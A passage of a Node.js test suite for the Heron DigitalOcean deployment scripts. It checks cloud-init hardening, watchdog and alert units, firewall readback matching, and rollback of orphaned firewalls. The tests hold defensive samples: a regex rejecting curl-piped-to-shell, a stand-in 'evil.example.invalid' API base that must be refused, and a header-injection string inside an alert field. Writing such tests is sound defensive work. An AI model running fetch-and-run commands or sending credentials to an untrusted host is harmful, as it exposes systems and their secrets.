
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, rmSync, utimesSync, readFileSync, readdirSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PKG_DIR = path.join(__dirname, '..');
const DO_DIR = path.join(PKG_DIR, 'digitalocean');
const CHECK_ASCII = path.join(PKG_DIR, 'scripts', 'check-ascii.py');
const DEPLOY_SCRIPT = path.join(DO_DIR, 'deploy-droplet.sh');
const WATCHDOG = path.join(DO_DIR, 'bin', 'heron-watchdog');
const ALERT = path.join(DO_DIR, 'bin', 'heron-alert');

function renderCloudInit(env = {}) {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--render-cloud-init'], {
    encoding: 'utf8',
    env: { ...process.env, ...env },
  });
  assert.equal(result.status, 0, `--render-cloud-init failed: ${result.stderr}`);
  return result.stdout;
}

test('the rendered cloud-init passes the ASCII guard (checked RENDERED, never the template)', () => {
  const rendered = renderCloudInit();
  const dir = mkdtempSync(path.join(os.tmpdir(), 'host-cloudinit-'));
  try {
    const file = path.join(dir, 'rendered.yaml');
    writeFileSync(file, rendered, 'utf8');
    const result = spawnSync('python3', [CHECK_ASCII, file], { encoding: 'utf8' });
    assert.equal(result.status, 0, `check-ascii.py refused the rendered file: ${result.stderr}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the rendered cloud-init is YAML-parseable (PyYAML if present, else a minimal structural check)', () => {
  const rendered = renderCloudInit();
  const dir = mkdtempSync(path.join(os.tmpdir(), 'host-cloudinit-yaml-'));
  try {
    const file = path.join(dir, 'rendered.yaml');
    writeFileSync(file, rendered, 'utf8');

    const probe = spawnSync('python3', ['-c', 'import yaml'], { encoding: 'utf8' });
    if (probe.status === 0) {
      const parsed = spawnSync(
        'python3',
        ['-c', `import yaml, sys; yaml.safe_load(open(sys.argv[1]))`, file],
        { encoding: 'utf8' },
      );
      assert.equal(parsed.status, 0, `PyYAML refused the rendered file: ${parsed.stderr}`);
      return;
    }

    assert.doesNotMatch(rendered, /\t/, 'cloud-init.yaml must not contain a tab character');
    assert.match(rendered, /^#cloud-config/, 'must open with the #cloud-config marker');
    const lines = rendered.split('\n').filter((l) => l.trim() !== '' && !l.trim().startsWith('#'));
    for (const line of lines) {
      assert.doesNotMatch(line, /^\s*\t/, `indentation uses a tab: ${line}`);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the rendered cloud-init carries every key build order step 6 requires', () => {
  const rendered = renderCloudInit();
  assert.match(rendered, /disable_root:\s*true/, 'missing disable_root: true');
  assert.match(rendered, /ssh_pwauth:\s*false/, 'missing ssh_pwauth: false');
  assert.match(
    rendered,
    /\/etc\/ssh\/sshd_config\.d\/00-heron\.conf/,
    'missing the 00-heron.conf sshd hardening file (must sort before cloud-init\'s own 50-cloud-init.conf)',
  );
  assert.match(
    rendered,
    /getent passwd 10001/,
    'missing the uid-10001-free assertion (the exact check that would have caught v1\'s uid 999 collision)',
  );
  assert.match(rendered, /docker\.io/, 'missing docker.io from Debian\'s own repository');
  assert.doesNotMatch(
    rendered,
    /curl[^\n]*\|\s*(sh|bash)\b/,
    'a curl-piped-to-shell shape must never appear in cloud-init',
  );
  const nonCommentLines = rendered.split('\n').filter((l) => !l.trim().startsWith('#'));
  for (const line of nonCommentLines) {
    assert.doesNotMatch(
      line,
      /^\s*monitoring\s*:/,
      `cloud-init must never set a "monitoring:" key itself -- that belongs only in the droplet-create API call: ${line}`,
    );
  }
});

test('--plan runs with no network and exits 0, printing every required section', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'host-plan-'));
  try {
    const doTokenFile = path.join(dir, 'do-token');
    const sshKeyFile = path.join(dir, 'id_ed25519.pub');
    writeFileSync(doTokenFile, 'fake-token-not-real\n', { mode: 0o600 });
    writeFileSync(sshKeyFile, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');

    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--plan'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        HERON_NO_NETWORK: '1',
        DO_TOKEN_FILE: doTokenFile,
        SSH_PUBLIC_KEY_FILE: sshKeyFile,
      },
    });

    assert.equal(result.status, 0, `--plan failed: ${result.stderr}`);
    const required = [
      '== Droplet',
      '== Firewall',
      '== Host paths',
      '== Credentials this step seals',
      '== What --create does',
      's-1vcpu-512mb-10gb',
      'debian-13-x64',
      'monitoring:  false',
      '/etc/heron/creds',
      'mail-key',
      'systemd-creds encrypt --with-key=host',
    ];
    for (const needle of required) {
      assert.ok(result.stdout.includes(needle), `--plan output is missing: ${needle}`);
    }
    assert.ok(!result.stdout.includes('fake-token-not-real'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('--create refuses without HERON_DEPLOY_CONFIRMED=1', () => {
  const env = { ...process.env };
  delete env.HERON_DEPLOY_CONFIRMED;
  delete env.DO_TOKEN_FILE;
  delete env.SSH_PUBLIC_KEY_FILE;
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env });
  assert.notEqual(result.status, 0, '--create must refuse with no confirmation env set');
  assert.match(result.stderr, /HERON_DEPLOY_CONFIRMED/);
});

test('--create refuses even with HERON_DEPLOY_CONFIRMED=1 set to the wrong value', () => {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], {
    encoding: 'utf8',
    env: { ...process.env, HERON_DEPLOY_CONFIRMED: 'yes' },
  });
  assert.notEqual(result.status, 0, 'only the literal value "1" may confirm a create');
});

function unit(name) {
  return readFileSync(path.join(DO_DIR, 'systemd', name), 'utf8');
}

test('heron-watchdog.service triggers the alert unit on failure and runs the watchdog binary', () => {
  const svc = unit('heron-watchdog.service');
  assert.match(svc, /OnFailure=heron-alert@watchdog\.service/);
  assert.match(svc, /ExecStart=\/usr\/local\/sbin\/heron-watchdog\s*$/m);
  assert.match(svc, /Type=oneshot/);
});

test('heron-watchdog.timer runs every 15 minutes and is not enabled by [Install] alone', () => {
  const timer = unit('heron-watchdog.timer');
  assert.match(timer, /OnUnitActiveSec=15min/);
  assert.match(timer, /Persistent=true/);
  assert.match(timer, /WantedBy=timers\.target/);
});

test('heron-alert@.service loads the mail key only through LoadCredentialEncrypted', () => {
  const svc = unit('heron-alert@.service');
  assert.match(svc, /LoadCredentialEncrypted=mail-key:\/etc\/heron\/creds\/mail-key\.cred/);
  assert.match(svc, /ExecStart=\/usr\/local\/sbin\/heron-alert %i/);
  assert.doesNotMatch(svc, /Environment=.*KEY/i, 'the key must never be passed as an Environment=');
});

test('heron-alive.timer fires daily at a fixed hour and points at the alert template', () => {
  const timer = unit('heron-alive.timer');
  assert.match(timer, /OnCalendar=\*-\*-\* \d{2}:00:00 UTC/);
  assert.match(timer, /Unit=heron-alert@alive\.service/);
});

test('heron-retention.service and .timer run the retention binary daily', () => {
  const svc = unit('heron-retention.service');
  const timer = unit('heron-retention.timer');
  assert.match(svc, /ExecStart=\/usr\/local\/sbin\/heron-retention\s*$/m);
  assert.match(timer, /OnCalendar=/);
});

test('heron-retention never removes anything that is not already compressed in archive/ first', () => {
  const script = readFileSync(path.join(DO_DIR, 'bin', 'heron-retention'), 'utf8');

  assert.doesNotMatch(script, /os\.unlink/);
  assert.equal((script.match(/os\.remove\(/g) ?? []).length, 1, 'exactly one os.remove(), the one after the gzip copy');
  assert.equal((script.match(/shutil\.rmtree\(/g) ?? []).length, 1, 'exactly one shutil.rmtree(), the one after the verified tar.gz');

  const verification = script.indexOf('if len(members) != expected:');
  const rmtree = script.indexOf('shutil.rmtree(');
  assert.ok(verification > 0, 'the archive read-back must exist');
  assert.ok(rmtree > verification, 'shutil.rmtree() must come after the archive has been read back and counted');
});

function runWatchdog(stateFile, extraEnv = {}) {
  return spawnSync(WATCHDOG, [], {
    encoding: 'utf8',
    env: { ...process.env, HERON_STATE_FILE: stateFile, ...extraEnv },
  });
}

test('the watchdog passes on a fresh state file', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'watchdog-fresh-'));
  try {
    const stateFile = path.join(dir, 'latest.json');
    writeFileSync(stateFile, '{"exit":0}', 'utf8');
    const result = runWatchdog(stateFile);
    assert.equal(result.status, 0, `expected a fresh file to pass: ${result.stderr}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the watchdog fires (non-zero exit) on a state file past the ceiling', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'watchdog-stale-'));
  try {
    const stateFile = path.join(dir, 'latest.json');
    writeFileSync(stateFile, '{"exit":0}', 'utf8');
    const ninetyOneMinutesAgo = new Date(Date.now() - 91 * 60 * 1000);
    utimesSync(stateFile, ninetyOneMinutesAgo, ninetyOneMinutesAgo);
    const result = runWatchdog(stateFile);
    assert.notEqual(result.status, 0, 'a 91-minute-old state file must fire the watchdog');
    assert.match(result.stderr, /past the 5400s ceiling/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the watchdog passes a state file just inside the ceiling and fires just past it (boundary)', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'watchdog-boundary-'));
  try {
    const stateFile = path.join(dir, 'latest.json');
    writeFileSync(stateFile, '{"exit":0}', 'utf8');

    const justUnder = new Date(Date.now() - 89 * 60 * 1000);
    utimesSync(stateFile, justUnder, justUnder);
    assert.equal(runWatchdog(stateFile).status, 0, '89 minutes old must still pass');

    const justOver = new Date(Date.now() - 91 * 60 * 1000);
    utimesSync(stateFile, justOver, justOver);
    assert.notEqual(runWatchdog(stateFile).status, 0, '91 minutes old must fail');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the watchdog fires on an absent state file', () => {
  const result = runWatchdog('/nonexistent/heron-test-fixture/latest.json');
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /does not exist/);
});

test('heron-alert --dry-run prints the message and needs no credential at all', () => {
  const env = { ...process.env };
  delete env.CREDENTIALS_DIRECTORY;
  const result = spawnSync('python3', [ALERT, 'watchdog', '--dry-run'], { encoding: 'utf8', env });
  assert.equal(result.status, 0, `dry-run must succeed with no CREDENTIALS_DIRECTORY: ${result.stderr}`);
  assert.match(result.stdout, /--dry-run/);
  assert.match(result.stdout, /subject: Heron alert: watchdog/);
});

test('heron-alert --dry-run never reads a key-shaped environment variable', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'alert-poison-'));
  try {
    const credsDir = path.join(dir, 'creds');
    writeFileSync(dir + '/marker', '', 'utf8');
    const result = spawnSync('python3', [ALERT, 'alive', '--dry-run'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        CREDENTIALS_DIRECTORY: credsDir, // deliberately does not exist
        MAIL_KEY: 'THIS-VALUE-MUST-NEVER-APPEAR',
        RESEND_API_KEY: 'THIS-VALUE-MUST-NEVER-APPEAR-EITHER',
      },
    });
    assert.equal(result.status, 0, `dry-run must not fail even with a non-existent creds dir: ${result.stderr}`);
    assert.ok(!result.stdout.includes('THIS-VALUE-MUST-NEVER-APPEAR'));
    assert.ok(!result.stdout.includes('THIS-VALUE-MUST-NEVER-APPEAR-EITHER'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('heron-alert without --dry-run and without CREDENTIALS_DIRECTORY refuses, naming the rule', () => {
  const env = { ...process.env };
  delete env.CREDENTIALS_DIRECTORY;
  const result = spawnSync('python3', [ALERT, 'watchdog'], { encoding: 'utf8', env });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /CREDENTIALS_DIRECTORY/);
});

test('heron-alert refuses a missing instance argument', () => {
  const result = spawnSync('python3', [ALERT], { encoding: 'utf8' });
  assert.equal(result.status, 2);
  assert.match(result.stderr, /usage/);
});

test('retention keeps the newest 200 files and archives (never deletes) the rest', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'retention-'));
  try {
    const now = Date.now();
    for (let i = 0; i < 400; i += 1) {
      const file = path.join(dir, `${String(i).padStart(4, '0')}.log`);
      writeFileSync(file, 'x'.repeat(100), 'utf8');
      const t = new Date(now - (400 - i) * 60 * 1000);
      utimesSync(file, t, t);
    }

    const result = spawnSync(path.join(DO_DIR, 'bin', 'heron-retention'), [], {
      encoding: 'utf8',
      env: { ...process.env, HERON_RUNS_DIR: dir },
    });
    assert.equal(result.status, 0, `retention failed: ${result.stderr}`);

    const remaining = readdirCount(dir, { excludeArchive: true });
    assert.equal(remaining, 200, 'exactly 200 live files should remain');

    const archived = readdirCount(path.join(dir, 'archive'));
    assert.equal(archived, 200, 'the other 200 must be archived, not deleted');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

function readdirCount(dir, { excludeArchive = false } = {}) {
  const entries = readdirSync(dir);
  return entries.filter((name) => !(excludeArchive && name === 'archive')).length;
}

import { createServer } from 'node:http';
import { execFile } from 'node:child_process';
import { mkdirSync, chmodSync, existsSync } from 'node:fs';

const LIB_DIR = path.join(DO_DIR, 'lib');
const DO_API = path.join(LIB_DIR, 'do_api.py');
const FIREWALL_MATCH = path.join(LIB_DIR, 'firewall_match.py');
const POST_BOOT = path.join(LIB_DIR, 'post-boot-assert.sh');
const SMOKE_ASSERT = path.join(LIB_DIR, 'smoke-assert.sh');
const CLOUD_INIT_FILE = path.join(DO_DIR, 'cloud-init.yaml');
const PURSE_SYSTEMD_DIR = path.join(PKG_DIR, '..', 'purse', 'systemd');

function tmpdir(prefix) {
  return mkdtempSync(path.join(os.tmpdir(), `heron2-${prefix}-`));
}

function plan(env = {}) {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--plan'], {
    encoding: 'utf8',
    env: { ...process.env, HERON_NO_NETWORK: '1', ...env },
  });
  assert.equal(result.status, 0, `--plan failed: ${result.stderr}`);
  return result.stdout;
}

const deployText = () => readFileSync(DEPLOY_SCRIPT, 'utf8');

function deadManFixture() {
  const dir = tmpdir('deadman');
  const state = path.join(dir, 'state');
  const watchdog = path.join(dir, 'watchdog');
  mkdirSync(state);
  mkdirSync(watchdog);
  const stateFile = path.join(state, 'latest.json');
  return {
    dir,
    state,
    watchdog,
    stateFile,
    stale: (minutes = 91) => {
      writeFileSync(stateFile, '{"exit":0}', 'utf8');
      const then = new Date(Date.now() - minutes * 60 * 1000);
      utimesSync(stateFile, then, then);
    },
    run: (extraEnv = {}) =>
      spawnSync(path.join(DO_DIR, 'bin', 'heron-watchdog'), [], {
        encoding: 'utf8',
        env: {
          ...process.env,
          HERON_STATE_FILE: stateFile,
          HERON_WATCHDOG_DIR: watchdog,
          ...extraEnv,
        },
      }),
  };
}

test('N-1: a forged marker in the CONTAINER-WRITABLE state directory no longer silences the notice', () => {
  const f = deadManFixture();
  try {
    f.stale();
    writeFileSync(path.join(f.state, 'degraded'), 'since=1\nlast_notified=99999999999\n', 'utf8');
    writeFileSync(path.join(f.state, 'alerts.jsonl'), '{"event":"recovered"}\n', 'utf8');

    const result = f.run();
    assert.notEqual(
      result.status,
      0,
      'a host that has stopped beating must ask for a notice, whatever the container wrote',
    );
    assert.doesNotMatch(result.stderr, /notice already sent/, 'the forged marker must not be read at all');
    assert.match(result.stderr, /past the 5400s ceiling/);
    assert.ok(existsSync(path.join(f.watchdog, 'degraded')), 'the marker belongs in the root-only directory');
    assert.ok(existsSync(path.join(f.watchdog, 'alerts.jsonl')), 'so does the record');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('N-1: a last_notified in the FUTURE is read as "never notified", so the notice is due', () => {
  const f = deadManFixture();
  try {
    f.stale();
    writeFileSync(path.join(f.watchdog, 'degraded'), 'since=1\nlast_notified=99999999999\n', 'utf8');
    const result = f.run();
    assert.notEqual(result.status, 0, 'a marker that claims a notice was sent in the future must not suppress one');
    assert.match(result.stderr, /which is in the future/);
    assert.doesNotMatch(result.stderr, /next notice in -/, 'SILENT_FOR must never be negative');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('N-1: a marker field that is not a run of digits is read as absent', () => {
  const f = deadManFixture();
  try {
    f.stale();
    writeFileSync(path.join(f.watchdog, 'degraded'), 'since=whenever\nlast_notified=soon\n', 'utf8');
    const result = f.run();
    assert.notEqual(result.status, 0, 'a corrupted marker must make the notice DUE, never suppressed');
    assert.match(result.stderr, /is not a run of digits/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('N-1: the watchdog directory is created 0700 root:root, printed by --plan, and asserted after boot', () => {
  const yaml = readFileSync(CLOUD_INIT_FILE, 'utf8');
  assert.match(
    yaml,
    /- \[ install, -d, -m, "0700", -o, root, -g, root, \/var\/lib\/heron\/watchdog \]/,
    'cloud-init never creates the watchdog directory',
  );
  assert.match(plan(), /\/var\/lib\/heron\/watchdog\s+0700 root:root/, '--plan never names it');
  assert.match(
    readFileSync(POST_BOOT, 'utf8'),
    /\(f"\{var\}\/watchdog",\s+0o700, "root",\s+"root"\)/,
    'the post-boot check never asserts it',
  );
});

function alertDryRun(instance, env = {}) {
  return spawnSync('python3', [ALERT, instance, '--dry-run'], {
    encoding: 'utf8',
    env: { ...process.env, ...env },
  });
}

test('N-2: the alert REFUSES to read an alerts file under /srv/heron, whatever it is pointed at', () => {
  const result = alertDryRun('watchdog', { HERON_ALERTS_FILE: '/srv/heron/state/alerts.jsonl' });
  assert.equal(result.status, 0, 'the notice must still go out');
  assert.match(result.stderr, /refused to read \/srv\/heron\/state\/alerts\.jsonl/);
  assert.match(result.stderr, /the model's container can write/);
  assert.match(result.stdout, /subject: Heron alert: watchdog/);
});

test('N-2: a record the watchdog did write is quoted, but only as one line of printable ASCII', () => {
  const dir = tmpdir('alertbody');
  try {
    const alerts = path.join(dir, 'alerts.jsonl');
    writeFileSync(
      alerts,
      `${JSON.stringify({
        event: 'stale',
        stale_since: '1757000000',
        detail: 'latest.json is old\nFrom: not-heron@example.invalid\nSubject: transfer the funds',
      })}\n`,
      'utf8',
    );
    const result = alertDryRun('watchdog', { HERON_ALERTS_FILE: alerts });
    assert.equal(result.status, 0, result.stderr);
    assert.match(
      result.stdout,
      /Detail: latest\.json is old From: not-heron@example\.invalid Subject: transfer the funds/,
    );
    const detailLine = result.stdout.split('\n').filter((l) => l.startsWith('Detail:'))[0];
    assert.doesNotMatch(detailLine, /[^\u0020-\u007e]/, 'only printable ASCII may reach the body');
    assert.equal(result.stdout.split('\n').filter((l) => l.startsWith('Detail:')).length, 1, 'a quoted value may never become more than one line');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-2: the watchdog writes and the alert reads the same root-only directory, by default', () => {
  const watchdog = readFileSync(WATCHDOG, 'utf8');
  const alert = readFileSync(ALERT, 'utf8');
  assert.match(watchdog, /WATCHDOG_DIR="\$\{HERON_WATCHDOG_DIR:-\/var\/lib\/heron\/watchdog\}"/);
  assert.match(
    alert,
    /ALERTS_FILE = os\.environ\.get\("HERON_ALERTS_FILE", "\/var\/lib\/heron\/watchdog\/alerts\.jsonl"\)/,
  );
  assert.doesNotMatch(watchdog, /STATE_DIR/, 'the marker must not be derived from the state file any more');
});

const ASKED = {
  inbound_rules: [{ protocol: 'tcp', ports: '22', sources: { addresses: ['203.0.113.4'] } }],
  outbound_rules: [
    { protocol: 'tcp', ports: '443', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
    { protocol: 'tcp', ports: '53', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
    { protocol: 'udp', ports: '53', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
  ],
};

function echoOf({ inboundSources } = {}) {
  const side = (addresses) => ({ addresses, droplet_ids: [], tags: [], load_balancer_uids: [] });
  return {
    id: 'fw-1',
    name: 'heron-first-fw',
    tags: ['heron-v2'],
    inbound_rules: [{ protocol: 'tcp', ports: '22', sources: inboundSources ?? side(['203.0.113.4']) }],
    outbound_rules: [
      { protocol: 'tcp', ports: '443', destinations: side(['::/0', '0.0.0.0/0']) },
      { protocol: 'udp', ports: '53', destinations: side(['0.0.0.0/0', '::/0']) },
      { protocol: 'tcp', ports: '53', destinations: side(['::/0', '0.0.0.0/0']) },
    ],
  };
}

function matchFirewall(requested, readback) {
  const dir = tmpdir('fwmatch');
  try {
    const a = path.join(dir, 'requested.json');
    const b = path.join(dir, 'readback.json');
    writeFileSync(a, JSON.stringify(requested), 'utf8');
    writeFileSync(b, JSON.stringify(readback), 'utf8');
    return spawnSync('python3', [FIREWALL_MATCH, a, b], { encoding: 'utf8' });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test('N-3: an echo whose inbound source carries tags is a MISMATCH -- a whole tag admitted on 22', () => {
  const result = matchFirewall(ASKED, {
    firewall: echoOf({
      inboundSources: {
        addresses: ['203.0.113.4'],
        droplet_ids: [],
        tags: ['heron-v2'],
        load_balancer_uids: [],
      },
    }),
  });
  assert.equal(result.status, 1, 'an inbound rule admitting a whole tag on 22 must be refused');
  assert.match(result.stderr, /tags=\[heron-v2\]/);
  assert.match(result.stderr, /must be empty/);
});

test('N-3: an echo whose inbound source carries droplet_ids is a MISMATCH', () => {
  const result = matchFirewall(ASKED, {
    firewall: echoOf({
      inboundSources: {
        addresses: ['203.0.113.4'],
        droplet_ids: [12345678],
        tags: [],
        load_balancer_uids: [],
      },
    }),
  });
  assert.equal(result.status, 1);
  assert.match(result.stderr, /droplet_ids=\[12345678\]/);
});

test('N-3: a correct DigitalOcean echo -- all four keys, all three lists empty -- still MATCHES', () => {
  const result = matchFirewall(ASKED, { firewall: echoOf() });
  assert.equal(result.status, 0, `a correct firewall was refused: ${result.stderr}`);
  assert.match(result.stdout, /load_balancer_uids empty in every rule/);
});

test('N-3: the docstring no longer says the three lists are deliberately ignored', () => {
  const text = readFileSync(FIREWALL_MATCH, 'utf8');
  assert.doesNotMatch(text, /deliberately ignored: droplet_ids/);
  assert.doesNotMatch(text, /the create body's own droplet_ids/, 'the create body does not send droplet_ids at all');
});

async function doServer(handlers) {
  const seen = [];
  const server = createServer((req, res) => {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', () => {
      seen.push(`${req.method} ${req.url}`);
      const answer = handlers(req.method, req.url, body);
      if (answer === null) {
        res.writeHead(204).end();
        return;
      }
      res.writeHead(answer.status ?? 200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(answer.body ?? {}));
    });
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  return {
    seen,
    base: `http://127.0.0.1:${port}`,
    close: () => new Promise((resolve) => server.close(resolve)),
  };
}

function runApi(args, base, extraEnv = {}) {
  return new Promise((resolve) => {
    execFile(
      'python3',
      [DO_API, ...args],
      { encoding: 'utf8', env: { ...process.env, HERON_DO_API_BASE: base, ...extraEnv } },
      (error, stdout, stderr) => resolve({ status: error ? (error.code ?? 1) : 0, stdout, stderr }),
    );
  });
}

function tokenFile(dir) {
  const file = path.join(dir, 'do-token');
  writeFileSync(file, 'not-a-real-token\n', { mode: 0o600 });
  chmodSync(file, 0o600);
  return file;
}

test('N-4: a firewall whose readback is widened is DELETED by the very call that created it', async () => {
  const dir = tmpdir('fwcreate');
  const widened = echoOf({
    inboundSources: {
      addresses: ['203.0.113.4'],
      droplet_ids: [],
      tags: ['heron-v2'],
      load_balancer_uids: [],
    },
  });
  const server = await doServer((method, url) => {
    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'heron-v2' } } };
    if (method === 'POST' && url === '/v2/firewalls') return { status: 201, body: { firewall: widened } };
    if (method === 'GET' && url === '/v2/firewalls/fw-1') return { body: { firewall: widened } };
    if (method === 'DELETE' && url === '/v2/firewalls/fw-1') return null;
    return { status: 404, body: {} };
  });
  try {
    const idFile = path.join(dir, 'firewall-id');
    const result = await runApi(
      [
        'firewall-create',
        tokenFile(dir),
        '203.0.113.4',
        'heron-first',
        'heron-v2',
        FIREWALL_MATCH,
        '--id-file',
        idFile,
      ],
      server.base,
    );
    assert.equal(result.status, 1, 'a widened readback must fail the create');
    assert.ok(
      server.seen.includes('DELETE /v2/firewalls/fw-1'),
      `the firewall it made was left on the account. Calls seen: ${server.seen.join(', ')}`,
    );
    assert.match(result.stderr, /firewall fw-1 deleted/);
    assert.equal(
      readFileSync(idFile, 'utf8').trim(),
      'fw-1',
      'the id must reach the id file the moment the POST returns',
    );
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-4: a firewall whose readback matches is kept, and its id is printed', async () => {
  const dir = tmpdir('fwok');
  const good = echoOf();
  const server = await doServer((method, url) => {
    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'heron-v2' } } };
    if (method === 'POST' && url === '/v2/firewalls') return { status: 201, body: { firewall: good } };
    if (method === 'GET' && url === '/v2/firewalls/fw-1') return { body: { firewall: good } };
    return { status: 404, body: {} };
  });
  try {
    const idFile = path.join(dir, 'firewall-id');
    const result = await runApi(
      [
        'firewall-create',
        tokenFile(dir),
        '203.0.113.4',
        'heron-first',
        'heron-v2',
        FIREWALL_MATCH,
        '--id-file',
        idFile,
      ],
      server.base,
    );
    assert.equal(result.status, 0, `a correct firewall was refused: ${result.stderr}`);
    assert.equal(result.stdout.trim(), 'fw-1');
    assert.ok(!server.seen.some((c) => c.startsWith('DELETE')), 'a correct firewall must not be deleted');
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-4: the rollback trap covers a firewall that never returned its id', () => {
  const dir = tmpdir('trap');
  try {
    const stubs = path.join(dir, 'stubs');
    mkdirSync(stubs);
    const stub = (name, body) => {
      const file = path.join(stubs, name);
      writeFileSync(file, `#!/usr/bin/env bash\n${body}\n`, 'utf8');
      chmodSync(file, 0o755);
    };
    stub('check_image_slug', 'exit 0');
    stub('check_no_existing_firewall', 'exit 0');
    stub(
      'create_firewall',
      'printf "fw-orphan\\n" > "$HERON_FIREWALL_ID_FILE"; echo "readback mismatch" >&2; exit 1',
    );
    stub('delete_firewall', 'touch "$HERON_TEST_DIR/deleted-$1"');
    stub('destroy_droplet', 'touch "$HERON_TEST_DIR/destroyed-$1"');

    const token = tokenFile(dir);
    const sshKey = path.join(dir, 'id_ed25519.pub');
    writeFileSync(sshKey, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');

    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        HERON_DEPLOY_CONFIRMED: '1',
        HERON_NO_NETWORK: '1',
        HERON_STUB_DIR: stubs,
        HERON_TEST_DIR: dir,
        HERON_RUN_RECORD_DIR: path.join(dir, 'records'),
        HERON_DESK_IP: '203.0.113.4',
        DO_TOKEN_FILE: token,
        SSH_PUBLIC_KEY_FILE: sshKey,
      },
    });
    assert.notEqual(result.status, 0, 'a failed firewall readback must fail the deploy');
    assert.ok(
      existsSync(path.join(dir, 'deleted-fw-orphan')),
      `the orphaned firewall was NOT deleted. stderr: ${result.stderr}`,
    );
    assert.match(result.stderr, /recovered fw-orphan from the id file/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-4: --create refuses at precondition time if a firewall already targets heron-v2', async () => {
  const dir = tmpdir('fwnone');
  const server = await doServer((method, url) => {
    if (method === 'GET' && url === '/v2/firewalls') {
      return { body: { firewalls: [{ id: 'fw-old', name: 'leftover-fw', tags: ['heron-v2'] }] } };
    }
    return { status: 404, body: {} };
  });
  try {
    const result = await runApi(['firewall-none', tokenFile(dir), 'heron-v2'], server.base);
    assert.equal(result.status, 1, 'a leftover firewall on the tag must refuse the create');
    assert.match(result.stderr, /already target tag heron-v2/);
    assert.match(result.stderr, /fw-old/);
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
  assert.match(deployText(), /"check_no_existing_firewall\|/, 'the check must be a precondition, not an afterthought');
});

test('N-4: do_api.py refuses an api base that is neither DigitalOcean nor loopback', async () => {
  const dir = tmpdir('apibase');
  try {
    const result = await runApi(['firewall-none', tokenFile(dir), 'heron-v2'], 'https://evil.example.invalid');
    assert.equal(result.status, 2);
    assert.match(result.stderr, /may only be https:\/\/api\.digitalocean\.com or a loopback address/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

function declaredPreconditions() {
  const text = deployText();
  const open = text.indexOf('CREATE_PRECONDITIONS=(');
  const block = text.slice(open, text.indexOf('\n)\n', open));
  return [...block.matchAll(/^\s*"([a-z_]+)\|(.+)"$/gm)].map((m) => [m[1], m[2].replace(/\\(.)/g, '$1')]);
}

function printedPreconditions(text) {
  const start = text.indexOf('== What --create does ==');
  const end = text.indexOf('Then, and only then:', start);
  assert.ok(start >= 0 && end > start, '--plan must print a precondition list');
  return [...text.slice(start, end).matchAll(/^\s+(\d+)\. (.+)$/gm)].map((m) => [Number(m[1]), m[2]]);
}

test("N-5: --plan's numbered preconditions ARE cmd_create's loop, row for row", () => {
  const declared = declaredPreconditions();
  const printed = printedPreconditions(plan());
  assert.ok(declared.length >= 9, `the array must be parseable, found ${declared.length} rows`);
  assert.equal(
    printed.length,
    declared.length,
    '--plan prints a different number of preconditions than the script runs',
  );
  declared.forEach(([, sentence], index) => {
    assert.equal(printed[index][0], index + 1, 'the printed list must be numbered in order');
    assert.equal(printed[index][1], sentence, `row ${index + 1} differs between the array and --plan`);
  });
});

test('N-5: every precondition named in the array is a function, and every check_ function is in the array', () => {
  const text = deployText();
  const declared = declaredPreconditions().map(([fn]) => fn);
  const defined = [...text.matchAll(/^(check_[a-z_]+)\(\) \{$/gm)].map((m) => m[1]);
  for (const fn of declared) {
    assert.ok(defined.includes(fn), `${fn} is named in CREATE_PRECONDITIONS and is not defined`);
  }
  for (const fn of defined) {
